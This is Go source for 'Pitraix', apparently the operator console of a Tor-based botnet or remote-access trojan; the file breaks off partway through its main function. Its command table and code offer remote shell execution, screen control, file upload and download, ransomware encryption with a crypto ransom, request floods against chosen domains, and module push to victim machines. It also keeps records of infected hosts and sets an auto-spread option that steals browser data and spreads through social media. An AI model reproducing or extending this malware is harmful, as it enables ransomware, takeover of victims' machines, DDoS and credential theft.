package main

import (
	"crypto"
	"crypto/aes"
	"crypto/cipher"
    "crypto/rand"
    "crypto/rsa"
    "crypto/sha512"
    "encoding/base64"
	"encoding/json"
	"encoding/pem"
	"encoding/hex"
	"crypto/x509"
	rdmod "math/rand"
	"unicode"
	"io/ioutil"
	"strings"
	"bufio"
	"errors"
	"fmt"
	"time"
	"bytes"
	"net/http"
	"net/url"
	"net"
	"path/filepath"
	"io"
	"os"
	"os/exec"
	// "os/signal"
	"strconv"
	"runtime"
	"archive/zip"
	
	// "database/sql"
	// _ "github.com/mattn/go-sqlite3"

	"github.com/gorilla/websocket"
	"golang.org/x/net/proxy"

)

const (
	auto_spread = true // optional snatches browser data and spreads using logged in social media

	ddosCounter = 25
	advancedAntiDDos_enabled = false // optional adds protection against targetted ddos, not really needed since v3 address is so long its impossible to bruteforce and ddosers are limited by TOR bandwidth 
	version = "1.2"
)

var (

	greenColor  = ""
	redColor    = ""
	blueColor   = ""
	yellowColor = ""
	endColor    = ""

	operKey = []byte{} 

	torProxyUrl, _ = url.Parse("SOCKS5H://127.0.0.1:9050")
	tbDialer, _ = proxy.FromURL(torProxyUrl, proxy.Direct)

	logAsyncChn = make(chan []string)

	rdpAsyncChn = make(chan []byte)
	rdpRECVAsyncChn = make(chan []byte)
	rdpSENTasyncChn = make(chan string)
	// rdpDone = make(chan bool)


	commands = map[string]string {
		"rdp [index]": "Control screen, mouse and keyboard, can only control 1 host at time",
		"shell [command]": "Executes a single shell command on host and waits for output",
		"shellnoop [command]": "Executes a single shell command on host without waiting for output",
		"shellrt [command]": "Establishes a real-time shell session for a single host",
		"ls/list": "Lists all hosts with basic information",
		"assign [agent index] [host index]": "Assigns a host to an Agent",
		"snatch [REGS/HSTS/LOGS/EVENTS]": "Snatches information from AG/HST database",
		"beep [frequency] [duration]": "Plays beep sound with said settings",
		"wallpaper [path]": "Sets wallpaper for host",
		"ransom [Amount] [Crypto Name] [Address]": "Starts a ransom and encrypts files for selected/GLOBAL",
		"decrypt": "Decrypts ransom files for selected/GLOBAL",
		"download [file path]": "Downloads file from host to operative",
		"upload [file path]": "Uploads file from operative to host",
		"cufol": "Fetches current directory",
		"cuexe": "Fetches current executeable path",
		"notify [Title] [Message]": "Sends a notification with set Title and Message",
		"noop": "This does nothing. Useful for manual pings/in-combo with custom modules",

		// "untar [path]": "extracts tar file from path",
		"unzip [path]": "extracts zip file from path",
		"select [key]": "Selects 1 or more hosts with index/country/city/username/platform/*. example to select entire of US: select US",
		"postreq [amount of requests] [domain] [payload](optional)": "Sends post request to domain with set amount and payload",
		"getreq [amount of requests] [domain]": "Sends get request to domain with set amount",
		"crashnearby": "Utilizes janet jackson 0-day to crash certain old laptops nearby",
		"pushmods": "Sends/Updates modules to the cell",
		"selfdestruct": "self destructs pitraix on selected hosts USE CAREFULLY",
		"info [index]": "displays all information about a single host",
		"instru": "Starts executing previous instructions",
		"operand [GLOBAL/1 or SELECT/2]": "Sets operand mode GLOBAL will instruct entire hostring while DIRECT only instructs selected hosts",
		"crout [RELAY/1 or DIRECT/2]": "Sets communcation route RELAY will relay instructions to AGS and HSTS while DIRECT directly instructs hosts",
		"hist/history": "Prints history of instructions",
		"exit/quit": "exits cleanly",
		"help": "Prints this list",
	}

	upgrader = websocket.Upgrader{} // Websocket support

	onetimeKey string
	twotimeKey string
)


type operLogsType struct {
	Logs map[string][]string
}

type instruType struct {
	INSTS []string
}

type t_HST struct {
	Address  []string
	IP 		 []string
	Country  []string
	City	 []string
	CPU 	 []string
	RAM		 []string
	Username []string
	Hostname []string
	
	Chassis  []int
	OS 		 []int
	OSVar	 []string
	Kernel   []string
	MacAddr  []string
	
	Arch 	 []int 
	Vendor   []string
	Model 	 []string

	ContactD []string
	Routes   [][]int
	AV 	     []string

	Key		 []string
	RasKey   []string
}


type t_HSTSingle struct {
	Address  string
	IP 		 string
	Country  string
	City	 string
	CPU 	 string
	RAM	     string
	Username string
	Hostname string

	Chassis  int
	OS 		 int
	OSVar	 string
	Kernel   string
	MacAddr  string

	
	Arch 	 int 
	Vendor   string
	Model 	 string

	ContactD string
	AV 	     string

	Key		 string
	RasKey   string
}


type modules_type struct {
	Name []string
	ID   []string
	Type []string
	Contents []string
	
	Execution  []string
	Candidates [][]int
}


type module_single_type struct {
	IP 		 string
	Country  string
	City	 string
	Username string
	Hostname string
	OS 		 string
	MacAddr  string
	Arch 	 string
	Vendor   string
	Model 	 string
	AV 	     string

	Type string
	Path string
	Contents string
	
	Execution string
	Enabled   bool
	ID		  string
	Name	  string
	Candidates []int
}



func GenerateRsaKeyPair() (*rsa.PrivateKey, *rsa.PublicKey) {
    privkey, _ := rsa.GenerateKey(rand.Reader, 4096)
    return privkey, &privkey.PublicKey
}

func ExportRsaPrivateKeyAsPemStr(privkey *rsa.PrivateKey) string {
    privkey_bytes := x509.MarshalPKCS1PrivateKey(privkey)
    privkey_pem := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: privkey_bytes,},)
    return string(privkey_pem)
}

func ParseRsaPrivateKeyFromPemStr(privPEM string) (*rsa.PrivateKey, error) {
    block, _ := pem.Decode([]byte(privPEM))
    if block == nil {
        return nil, errors.New("failed to parse PEM")
    }

    priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
    if err != nil {
        return nil, err
    }

    return priv, nil
}

func ExportRsaPublicKeyAsPemStr(pubkey *rsa.PublicKey) (string, error) {
    pubkey_bytes, err := x509.MarshalPKIXPublicKey(pubkey)
    if err != nil {
        return "", err
    }
    pubkey_pem := pem.EncodeToMemory(&pem.Block{Type: "RSA PUBLIC KEY", Bytes: pubkey_bytes,},)


    return string(pubkey_pem), nil
}

func ParseRsaPublicKeyPEM(pubPEM string) (*rsa.PublicKey, error) {
    block, _ := pem.Decode([]byte(pubPEM))
    if block == nil {
		return nil, errors.New("failed to parse PEM")
    }

    pub, err := x509.ParsePKIXPublicKey(block.Bytes)
    if err != nil {
        return nil, err
    }

    switch pub := pub.(type) {
    case *rsa.PublicKey:
        return pub, nil
    default:
         break
    }
    return nil, errors.New("key is not RSA")
}

func unzip(src, dest string) error {
    r, err := zip.OpenReader(src)
    if err != nil {
        return err
    }
    defer func() {
        if err := r.Close(); err != nil {
            // panic(err)
			log("unzip", "error while unzipping: " + err.Error())
			fmt.Println(err)
        }
    }()

    os.MkdirAll(dest, 0755)

    extractAndWriteFile := func(f *zip.File) error {
        rc, err := f.Open()
        if err != nil {
            return err
        }
        defer func() {
            if err := rc.Close(); err != nil {
				log("unzip", "error while extracting: " + err.Error())
                fmt.Println(err)
            }
        }()

        path := filepath.Join(dest, f.Name)

        if f.FileInfo().IsDir() {
            os.MkdirAll(path, f.Mode())
        } else {
            os.MkdirAll(filepath.Dir(path), f.Mode())
            f, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
            if err != nil {
                return err
            }
            defer func() {
                if err := f.Close(); err != nil {
                    fmt.Println(err)
                }
            }()

            _, err = io.Copy(f, rc)
            if err != nil {
                return err
            }
        }
        return nil
    }

    for _, f := range r.File {
        err := extractAndWriteFile(f)
        if err != nil {
            return err
        }
    }

    return nil
}


func basic_antiDDOS_check(h *t_HSTSingle) bool {
	if len(strings.TrimSpace(h.Address)) != 56 {
		// fmt.Println("address len not 56", len(h.Address))
		log("basic_antiDDOS_check", "Address length is not 56: " + strconv.Itoa(len(h.Address)))
		return false
	}

	if len(strings.TrimSpace(h.IP)) < 6 || len(strings.TrimSpace(h.IP)) > 15 {
		// fmt.Println("ip len weird", len(h.IP))
		log("basic_antiDDOS_check", "IP length is weird: " + strconv.Itoa(len(h.IP)))
		return false
	}

	if len(strings.TrimSpace(h.Country)) != 2 {
		// fmt.Println("country len not 2", len(h.Country))
		log("basic_antiDDOS_check", "Country length is not 2: " + strconv.Itoa(len(h.Country)))
		return false
	}

	if len(strings.TrimSpace(h.RAM)) > 50 {
		// fmt.Println("ram len not 9 10 11", len(h.RAM))
		log("basic_antiDDOS_check", "RAM length is higher than 50: " + strconv.Itoa(len(h.RAM)))
		return false
	}

	if len(strings.TrimSpace(h.Username)) < 1 || len(strings.TrimSpace(h.Username)) > 256 {
		// fmt.Println("user len larger than 256", len(h.Username))
		log("basic_antiDDOS_check", "Username length weird: " + strconv.Itoa(len(h.Username)))
		return false
	}

	if h.Chassis > 9 || h.Chassis < -1 {
		// fmt.Println("chassis larger than 9", h.Chassis)
		log("basic_antiDDOS_check", "Chassis length weird: " + strconv.Itoa(h.Chassis))
		return false
	}

	if h.OS > 5 || h.OS < -1 {
		log("basic_antiDDOS_check", "OS length weird: " + strconv.Itoa(h.OS))
		return false
	}

	if len(h.OSVar) > 265 || len(h.OSVar) < -1 {
		log("basic_antiDDOS_check", "OSVar length weird: " + strconv.Itoa(len(h.OSVar)))
		return false
	}

	if len(h.Kernel) > 265 || len(h.Kernel) < -1 {
		log("basic_antiDDOS_check", "Kernel length weird: " + strconv.Itoa(len(h.Kernel)))
		return false
	}

	if h.Arch > 5 || h.Arch < -1 {
		log("basic_antiDDOS_check", "Arch length weird: " + strconv.Itoa(h.Arch))
		return false
	}

	if len(h.Vendor) > 265 || len(h.Vendor) < -1 {
		log("basic_antiDDOS_check", "Vendor length weird: " + strconv.Itoa(len(h.Vendor)))
		return false
	}

	if len(h.Model) > 265 || len(h.Model) < -1 {
		log("basic_antiDDOS_check", "Model length weird: " + strconv.Itoa(len(h.Model)))
		return false
	}

	if len(h.ContactD) > 300 || len(h.ContactD) < 5 {
		log("basic_antiDDOS_check", "ContactD length weird: " + strconv.Itoa(len(h.ContactD)))
		return false
	}


	_, err := base64.StdEncoding.DecodeString(h.Key)
	if err != nil {
		log("basic_antiDDOS_check", "Key base64 error: " + err.Error())
		return false
	}

	// if len(test) != 32 {
	// 	log("basic_antiDDOS_check", "Key length weird: " + strconv.Itoa(len(h.Key)))
	// 	return false
	// }


	_, err = base64.StdEncoding.DecodeString(h.RasKey)
	if err != nil {
		log("basic_antiDDOS_check", "RasKey base64 error: " + err.Error())
		return false
	}

	// if len(test) != 32 {
	// 	log("basic_antiDDOS_check", "RasKey length weird: " + strconv.Itoa(len(h.RasKey)))
	// 	return false
	// }

	// if len(h.Key) > 50 || len(h.Key) < 1 {
		// log("basic_antiDDOS_check", "Key length weird: " + strconv.Itoa(len(h.Key)))
		// return false
	// }


	// if len(h.RasKey) > 50 || len(h.RasKey) < 1 {
	// 	log("basic_antiDDOS_check", "RasKey length weird: " + strconv.Itoa(len(h.RasKey)))
	// 	return false
	// }
	

	return true
}

func adv_antiddos_check(addr, key string) bool {
	if advancedAntiDDos_enabled {
		
		keyb, err := base64.StdEncoding.DecodeString(key)
		if err != nil {
			go log("adv_antiddos_check", "Did not pass test: " + addr)
			return false
		}


		for i := 1; i < 5; i++ {
			_, err := doInstru(addr, []byte("[\"noop 1\"]"), keyb, true) // postRequest("http://" + addr +".onion", true, 30)
			if err == nil {
				// fmt.Println("passed advanced test")
				return true
			}
		}

		// fmt.Println("DIDN'T pass advanced test")

		go log("adv_antiddos_check", "Did not pass test: " + addr)

		return false
	} else {
		// fmt.Println("advanced anti ddos test disabled, skipping..")
		return true
	}
}

func file_Exists(filePath string) bool {
	_, err := os.Stat(filePath)
	return !os.IsNotExist(err)
}

func readFile(filePath string) ([]byte, error){
	file, err := os.Open(filePath)
	if err != nil {
		return []byte{}, err
	}
	defer file.Close()

	fs, _ := file.Stat()
	b := make([]byte, fs.Size())

	for {
		_, err := file.Read(b)
		if err != nil {
			if err != io.EOF {
				return []byte{}, err
			}
			break
		}
	}
	return b, nil
}

func running_check(port string) bool {
	running := true
		conn, err := net.DialTimeout("tcp", "127.0.0.1:" + port, time.Second)
	if err != nil {
		running = false
	}
	if conn != nil {
		running = true
		conn.Close()
	}
	return running
}


func load_hostring(fileName string) (t_HST, []int, error) {
	var hostring_data t_HST
	var hostring_agents = []int{}

	data, err := ioutil.ReadFile(fileName)
    if err != nil {
		// f := os.Create(filename)
		return hostring_data, hostring_agents, err
    }
	err = json.Unmarshal(data, &hostring_data)

	for index, routeSlience := range hostring_data.Routes {
		if len(routeSlience) != 0 {
			// fmt.Println("Agent detected!", index)
			hostring_agents = append(hostring_agents, index)
		}
	}
	return hostring_data, hostring_agents, nil
}

func setupTor(path, port, name string, forceSetup bool) string {	
	var torexecName string = "tor"
	var ft bool = false
	if !file_Exists(filepath.Join(path, name)) || forceSetup == true {
		ft = true
		fmt.Printf("%s>%s TOR not found! Downloading TOR..\n", yellowColor, endColor)
		// fmt.Println("Tor not found!", !file_Exists(filepath.Join(path, name)), forceSetup)
		
		var v1m, v2m, v3m int = 11, 4,  0
		var found bool = false
		for {
			tor, err := getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/", v1m ,v2m, v3m), false, 10)
			if err != nil {
				fmt.Println(err)
				time.Sleep(time.Second * 5)
				continue
			}
			if len(tor) < 300 {
				// fmt.Println("Not found", v1m, v2m, v3m)
				if v3m == 20 {
					v3m = 0
					v2m += 1
				} else {
					v3m += 1
				}

				if v2m == 20 {
					v2m = 0
					v1m += 1
				}

				// if v1m == 20 {
				// 	v1m += 1
				// }
				if found == false {
					continue
				}
			}
			if found == false {
				fmt.Printf("%s>%s TOR version %sfound%s. Downloading..\n", blueColor, endColor, blueColor, endColor)
				// fmt.Println("Found, doing found check..")
				found = true
			} else {
				// fmt.Println(runtime.GOOS)
				if runtime.GOOS != "linux" {
					y := strings.Index(string(tor), `<a href="tor-win64`)
					z := strings.TrimSpace(string(tor)[y + 5:y + 70])
					
					st := strings.Index(z, ">") + 1
					ed := strings.Index(z, "<")
					fnl := strings.TrimSpace(z[st:ed])
					
					tor, _ = getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/%s", v1m, v2m, v3m, fnl), false, -1)
					// fmt.Println(tor, err)
					fmt.Printf("%s>%s TOR %sdownloaded%s. Setting it up..\n", blueColor, endColor, blueColor, endColor)

					f, _ := os.Create(filepath.Join(path, name + ".zip"))
					f.Write(tor)
					f.Close()
					unzip(filepath.Join(path, name + ".zip"), filepath.Join(path, name))
					os.Remove(filepath.Join(path, name + ".zip"))
					torexecName += ".exe"
				} else {
					// fmt.Println("linux!")
					tor, _ = getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/tor-browser-linux64-%d.%d.%d_en-US.tar.xz", v1m ,v2m, v3m, v1m, v2m, v3m), false, -1)

					fmt.Printf("%s>%s TOR %sdownloaded%s. Setting it up..\n", blueColor, endColor, blueColor, endColor)

					f, _ := os.Create(filepath.Join(path, name + ".tar.xz"))
					f.Write(tor)
					f.Close()
					legacy_doInstru("shell", fmt.Sprintf("tar -xf %s/%s.tar.xz -C %s && cp -R %s/tor-browser_en-US/Browser/TorBrowser/Tor %s && rm -rf %s/%s.tar.xz %s/tor-browser_en-US", path, name, path, path, path + "/" + name, path, name, path))
					


				}
				break
			}

		}

		torrcf, _ := os.Create(filepath.Join(path, name, name + "torrc"))
		defer torrcf.Close()
		torrcf.Write([]byte(fmt.Sprintf(`HiddenServiceDir %s
HiddenServicePort 80 127.0.0.1:%s`, filepath.Join(path, name, name + "hid"), port)))

	}


	if runtime.GOOS != "linux" {
		legacy_doInstru("shellnoop", filepath.Join(path, name, "Tor", torexecName) + " -f " + filepath.Join(path, name, name + "torrc"))
	} else {
		os.Setenv("LD_LIBRARY_PATH",  path + "/" + name) // needed for latest linux snitches couldn't figure this one
		legacy_doInstru("shellnoop", filepath.Join(path, name, torexecName) + " -f " + filepath.Join(path, name, name + "torrc"))
	}

	if ft == true {
		time.Sleep(time.Second * 5)
	}
	hostnamef, err := readFile(filepath.Join(path, name, name + "hid", "hostname"))
	rhostname := strings.Split(string(hostnamef), ".")[0]
	if err != nil {
		fmt.Println("hostname read error:", err)
		rhostname = setupTor(path, port, name, true)
	}

	return rhostname
}

func fetchOnlineAGS(hostring_d t_HST, agents_indexes []int) []int {
	// log("start", "fetching online agents..")
	online_agents := []int{}

	for _, ag := range agents_indexes {
		addr := hostring_d.Address[ag] // Routes[ag]
		key, err := base64.StdEncoding.DecodeString(hostring_d.Key[ag])

		fmt.Printf("\n\n%s>%s Fetching agent %s%s%s..\n\n", yellowColor, endColor, yellowColor, addr, endColor)
		_, err = doInstru(addr, []byte("[\"noop 1\"]"), key, true)
		if err == nil {
			online_agents = append(online_agents, ag) // DEBUG
			fmt.Printf("\n%s>%s Agent %s%s%s is %sonline%s\n", blueColor, endColor, greenColor, addr, greenColor, greenColor, endColor)

		} else {
			fmt.Printf("\n%s>%s Agent %s%s%s is %soffline%s\n", redColor, endColor, redColor, addr, endColor, redColor, endColor)
		}
	}

	return online_agents
}

func neatierList(str string, numb, curbNumb int) (string, bool) {
	var biggerThanReq bool
	if len(str) > numb {
		biggerThanReq = true
	} else {
		biggerThanReq = false
	}
	for {
		if len(str) >= numb {
			break
		}
		str += " "

	}
	if biggerThanReq {
		return str[:curbNumb], biggerThanReq
	} else {
		return str, biggerThanReq
	}
}

func logUpdaterAsync() {
	for nl := range logAsyncChn {
		logsf, err := readFile("OPER_logs.json")
		if err != nil {
			logsf = []byte("{\"Logs\": {}}")
		}
		var logs operLogsType
		json.Unmarshal(logsf, &logs)
		logs.Logs[strconv.Itoa(len(logs.Logs) + 1)] = []string{nl[0], nl[1], nl[2]}
		f, _ := os.Create("OPER_logs.json")
		out, _ := json.MarshalIndent(logs, "", " ")
		f.Write(out)
		f.Close()
	}
}


func log(logContext, logInfo string) {
	logTimestamp := time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
	// logTimestamp = logTimestamp[2:strings.Index(logTimestamp, ".")]
	// logTimestamp = strings.Replace(logTimestamp, " ", "", -1)
	// logTimestamp = strings.Replace(logTimestamp, ":", "", -1)

	logAsyncChn <- []string{logContext, logInfo, logTimestamp}
}


func confirm_global() bool {
	var confirm string
	// if operand == 1 {
	fmt.Printf("%s>%s Operand is %sGLOBAL%s continue? [%sY%s/%sN%s] ", yellowColor, endColor, greenColor, endColor, blueColor, endColor, redColor, endColor)
	// } else {
		// fmt.Printf("%s>%s Selected all hosts! continue? [%sY%s/%sN%s] ", yellowColor, endColor, blueColor, endColor, redColor, endColor)
	// }
	fmt.Scanf("%s", &confirm)
	if strings.ToLower(confirm) != "y" && strings.ToLower(confirm) != "yes" {
		fmt.Printf("%s>%s Aborted.\n", redColor, endColor)
		return false
	}
	return true
}

func readableContactDate(d string) string {
	currentDate_raw := time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
	// currentDate_raw = currentDate_raw[2:strings.Index(currentDate_raw, ".")]
	// currentDate_raw = strings.Replace(currentDate_raw, " ", "", -1)
	// currentDate_raw = strings.Replace(currentDate_raw, ":", "", -1)

	currentDate, _ := strconv.Atoi(currentDate_raw)
	hostDate, _ := strconv.Atoi(d)
	
	// fmt.Println(currentDate, hostDate, currentDate - hostDate)
	infectionDate := 69-69 // hostDate - currentDate // strconv.Itoa(currentDate - hostDate)
	if infectionDate < 1 {
		infectionDate = currentDate - hostDate
	}
	
	// fmt.Println(currentDate, hostDate, currentDate - hostDate)
	if infectionDate < 60 {
		return "Just now"
	} else if infectionDate < 120 {
		return "minute ago"
	} else if infectionDate < 950 {
		return "15 minutes ago"
	} else if infectionDate < 1800 {
		return "30 minutes ago"
	} else if infectionDate < 3600 {
		return "a hour ago"
	} else if infectionDate < 7200 {
		return "2 hours ago"
	} else if infectionDate < 10800 {
		return "3 hours ago"
	} else if infectionDate < 14400 {
		return "4 hours ago"
	} else if infectionDate < 18000 {
		return "5 hours ago"
	} else if infectionDate < 21600 {
		return "6 hours ago"
	} else if infectionDate < 28800 {
		return "8 hours ago"
	} else if infectionDate < 36000 {
		return "10 hours ago"
	} else if infectionDate < 43200 {
		return "12 hours ago"
	} else if infectionDate < 64800 {
		return "16+ hours ago"
	} else if infectionDate < 86400 {
		return "1 day ago"
	} else if infectionDate < 172800 {
		return "2 days ago"
	} else if infectionDate < 259200 {
		return "3 days ago"
	} else if infectionDate < 345600 {
		return "4 days ago"
	} else if infectionDate < 432000 {
		return "5 days ago"
	} else if infectionDate < 518400 {
		return "6 days ago"
	} else if infectionDate < 604800 {
		return "a week ago"
	// } else if infectionDate < 172800 {

	// } else if infectionDate < 172800 {

	// } else if infectionDate < 172800 {
	
	// } else if infectionDate < 172800 {

	} else {
		return "a while ago"
	}
}


func contains(s []int, e int) bool {
    for _, a := range s {
        if a == e {
            return true
        }
    }
    return false
}


func legacy_doInstru(ic, iv string) string {
	// fmt.Println("doInstru", ic, iv)
	var shell string
	var sec string
	
	if runtime.GOOS != "linux" {
		shell = os.Getenv("HOMEDRIVE") + "\\Windows\\System32\\cmd.exe"
		sec = "/c"
		
	} else {
		shell = os.Getenv("SHELL")
		sec = "-c"
	}

	var out string 
	switch (ic) {
	case "shell": // shell instruction with output (locking)
		cmd := exec.Command(shell, sec, iv)
		var outbuffer bytes.Buffer

		cmd.Stderr = &outbuffer
		cmd.Stdout = &outbuffer
		cmd.Run()
		
		out = outbuffer.String()
		// fmt.Println("out: ", out)

	case "shellnoop": // shell instruction without output (non locking)
		cmd := exec.Command(shell, sec, iv)
		cmd.Start()
	}

	return out
}


func doInstru(addr string, inst, hstAES_Key []byte, direct bool) ([]byte, error) {
	payload_enc, nonce, _ := encrypt_AES(inst, hstAES_Key)

	payload_enc_tmp_1 := base64.StdEncoding.EncodeToString(payload_enc)
	payload_enc_tmp_2 := base64.StdEncoding.EncodeToString(nonce)
	payload :=  payload_enc_tmp_1 + "|" + payload_enc_tmp_2
	if direct == true || direct == false { // not needed now maybe in future
		// fmt.Println("payload:", payload)
		x, err := postRequest("http://" + addr + ".onion", []byte(payload), true, -1)
		if err != nil {
			return []byte{}, err
		} else {
			dataSlice := strings.Split(string(x), "|")
			if len(dataSlice) == 2 {
				temp_decipher, _ := base64.StdEncoding.DecodeString(dataSlice[0])
				temp_nonce   , _ := base64.StdEncoding.DecodeString(dataSlice[1])
				decipher, err := decrypt_AES(temp_decipher, temp_nonce, hstAES_Key)
				if err != nil {
					return []byte{}, err
				} else {
					return decipher, nil
				}
			} else {
				return []byte{}, errors.New("dataSlice len not 2! " + string(x))
			}
		}
	}
	return []byte{}, nil
} 


func (modules *modules_type) loadModules(path string, hrd *t_HST) {
	files, _ := ioutil.ReadDir(path)
	
	if len(files) > 0 {
		fmt.Printf("%s>%s Loading %sModules%s..\n\n", yellowColor, endColor, redColor, endColor)

	}

	for _, file := range files {
		fname := file.Name()

		if !file.IsDir() {
			fmt.Printf("%s>%s Error loading module %s%s%s: not a directory, skipping..\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		main, err := readFile(filepath.Join("modules", fname, "main.json"))
		if err != nil {
			fmt.Printf("%s>%s Error loading module %s%s%s: No %smain.json%s found, skipping..\n\n", redColor, endColor, redColor, fname, endColor, redColor, endColor )
			continue
		}

		var mod module_single_type
		
		err = json.Unmarshal(main, &mod)
		if err != nil {
			fmt.Printf("%s>%s Error loading module %s%s%s: Error unmarshalling module %s%s%s, skipping..\n\n", redColor, endColor, redColor, fname, endColor, redColor, err.Error(), endColor)
			continue
		}

		if mod.Enabled == false {
			fmt.Printf("%s>%s Skipping disabled module %s%s%s \n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		contentsTmp, err := readFile(filepath.Join("modules", fname, mod.Path))
		if err != nil {
			fmt.Printf("%s>%s Error loading module %s%s%s: No %s%s%s path found, skipping..\n\n", redColor, endColor, redColor, fname, endColor, redColor, path, endColor )
			continue
		}

		if strings.ToLower(mod.OS) != "windows" && strings.ToLower(mod.OS) != "linux" && strings.ToLower(mod.OS) != "else" {
			fmt.Printf("%s>%s Error loading module %s%s%s:Invalid OS!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		if len(mod.Country) != 2 && mod.Country != "*" {
			fmt.Printf("%s>%s Error loading module %s%s%s: Invalid Country!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		if strings.TrimSpace(mod.City) == "" {
			fmt.Printf("%s>%s Error loading module %s%s%s: Invalid City!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		if strings.TrimSpace(mod.Username) == "" {
			fmt.Printf("%s>%s Error loading module %s%s%s: Invalid Username!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		if strings.TrimSpace(mod.Hostname) == "" {
			fmt.Printf("%s>%s Error loading module %s%s%s: Invalid Hostname!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}
		
		if strings.TrimSpace(mod.IP) == "" {
			fmt.Printf("%s>%s Error loading module %s%s%s: Invalid IP!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		if strings.TrimSpace(mod.Arch) == "" {
			fmt.Printf("%s>%s Error loading module %s%s%s: Invalid Arch!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		if strings.TrimSpace(mod.MacAddr) == "" {
			fmt.Printf("%s>%s Error loading module %s%s%s: Invalid MacAddr!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		if strings.TrimSpace(mod.Vendor) == "" {
			fmt.Printf("%s>%s Error loading module %s%s%s: Invalid Vendor!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		if strings.TrimSpace(mod.Model) == "" {
			fmt.Printf("%s>%s Error loading module %s%s%s: Invalid Model!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		if strings.TrimSpace(mod.AV) == "" {
			fmt.Printf("%s>%s Error loading module %s%s%s: Invalid AV!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		if mod.Type != "powershell" && mod.Type != "bash" && mod.Type != "exe" {
			fmt.Printf("%s>%s Error loading module %s%s%s: Invalid Type!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}


		if mod.Execution != "onBoot" && mod.Execution != "onInstruct" && mod.Execution != "onEvent" {
			fmt.Printf("%s>%s Error loading module %s%s%s: Invalid Execution!\n\n", redColor, endColor, redColor, fname, endColor)
			continue
		}

		mod.Contents = base64.StdEncoding.EncodeToString(contentsTmp)

		hasher := sha512.New()
		hasher.Write(contentsTmp) // ######## Hashes the content, not the base64 #########

		mod.Name = fname

		mod.ID = hex.EncodeToString(hasher.Sum(nil))

		var candidates []int
		for indx, _ := range hrd.Address {
			country  := hrd.Country[indx]
			city  := hrd.City[indx]
			username := hrd.Username[indx]
			hostname := hrd.Hostname[indx]

			osraw   := hrd.OS[indx]
			var os string
			if osraw == 0 {
				os = "linux"
			} else if osraw == 1 {
				os = "windows"
			} else {
				os = "else"
			} 

			var arch string
			archraw := hrd.Arch[indx]

			if archraw == 0 {
				arch = "x86-64"
			} else if archraw == 1 {
				arch = "x86"
			} else {
				arch = "else"
			}


			ip      := hrd.IP[indx]
			macAddr := hrd.MacAddr[indx]
			vendor  := hrd.Vendor[indx]
			model   := hrd.Model[indx]
			av  	:= hrd.AV[indx]

			matchesCount := 0

			if os == strings.ToLower(mod.OS) || mod.OS == "*" {
				matchesCount += 1
			}

			if country == mod.Country || mod.Country == "*" {
				matchesCount += 1
			}

			if city == mod.City || mod.City == "*" {
				matchesCount += 1
			}

			if username == mod.Username || mod.Username == "*" {
				matchesCount += 1
			}

			if hostname == mod.Hostname || mod.Hostname == "*" {
				matchesCount += 1
			}

			if ip == mod.IP || mod.IP == "*" {
				matchesCount += 1
			}

			if arch == mod.Arch || mod.Arch == "*" {
				matchesCount += 1
			}

			if macAddr == mod.MacAddr || mod.MacAddr == "*" {
				matchesCount += 1
			}

			if vendor == mod.Vendor || mod.Vendor == "*" {
				matchesCount += 1
			}

			if model == mod.Model || mod.Model == "*" {
				matchesCount += 1
			}

			if av == mod.AV || mod.AV == "*" {
				matchesCount += 1
			}


			if matchesCount == 11 {
				candidates = append(candidates, indx)
				// fmt.Println("noice", pathFile)
			}
			
		}

		mod.Candidates = candidates

		modules.ID = append(modules.ID, mod.ID)
		modules.Name = append(modules.Name, mod.Name)
		modules.Type = append(modules.Type, mod.Type)
		modules.Contents = append(modules.Contents, mod.Contents)
		modules.Execution = append(modules.Execution, mod.Execution)
		modules.Candidates = append(modules.Candidates, mod.Candidates)
		

	}


	if len(files) > 0 {
		fmt.Printf("%s>%s Loaded %s%d%s modules \n\n", blueColor, endColor, blueColor, len(files), endColor)
	}

}

func main() {
	if os.PathSeparator == 47 {
		greenColor  = "\x1b[32m"
		redColor    = "\x1b[91m"
		blueColor   = "\x1b[34m"
		yellowColor = "\x1b[93m"
		endColor    = "\x1b[0m"
	}
	fmt.Printf("%s>%s Loading %sPitraix%s..\n\n", yellowColor, endColor, redColor, endColor)
	currentPath, _ := os.Executable()

	agentAddress := setupTor(filepath.Dir(currentPath), "1337", "tor", false)

	hostring_d, all_AGS, err := load_hostring("hostring.json")
	if err != nil {
		f, _ := os.Create("hostring.json")
		f.WriteString(`{"Address": [],"IP": [],"Country": [],"City": [],"CPU": [],"RAM": [],"Username": [],"Hostname": [],"Chassis": [],"OS": [],"OSVar": [],"Kernel": [],"MacAddr": [],"Arch": [],"Vendor": [],"Model": [],"ContactD": [], "AV": [], "Routes": [],"Key": [],"RasKey": []}`)
		f.Close()
		fmt.Println(yellowColor + ">" + endColor + " Creating hostring.json..")

		hostring_d, all_AGS, err = load_hostring("hostring.json")
	}

	var operPrivKey *rsa.PrivateKey
	operPrivKeyTmp1, err := readFile("OPER_PrivateKey.pitraix")
	if err != nil {
		fmt.Println(yellowColor + ">" + endColor + " First startup detected! Generating RSA keys..")
		priv, pub := GenerateRsaKeyPair()
        priv_pem := strings.TrimSpace(ExportRsaPrivateKeyAsPemStr(priv))
        pub_pemR, _ := ExportRsaPublicKeyAsPemStr(pub)
        pub_pem := strings.TrimSpace(pub_pemR)
		
